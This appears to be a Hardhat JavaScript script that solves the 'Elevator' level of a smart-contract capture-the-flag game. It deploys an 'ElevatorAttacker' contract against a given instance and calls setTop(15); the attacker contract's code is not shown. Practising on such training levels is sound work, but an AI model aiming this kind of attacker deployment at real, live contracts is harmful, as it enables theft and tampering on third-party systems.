const {BLOCK_EXPLORER_URL, ELEVATOR_INSTANCE_ADDRESS} = require('./utils');

async function main() {
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
    console.log('Elevator level');

    if (!ELEVATOR_INSTANCE_ADDRESS) {
        console.log('Elevator instance address not found');
        return;
    }

    console.log('Elevator instance address', ELEVATOR_INSTANCE_ADDRESS);

    const factory = await ethers.getContractFactory("Elevator");
    const contract = factory.attach(ELEVATOR_INSTANCE_ADDRESS);

    const attackerFactory = await ethers.getContractFactory("ElevatorAttacker");
    const attackerContract = await attackerFactory.deploy(contract.address);
    await attackerContract.deployed();
    
    const tx = await attackerContract.setTop(15);
    console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);
    await tx.wait(1);

    console.log('\x1b[32m%s\x1b[0m', 'Elevator level. Done !!!');
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
}

module.exports = main;
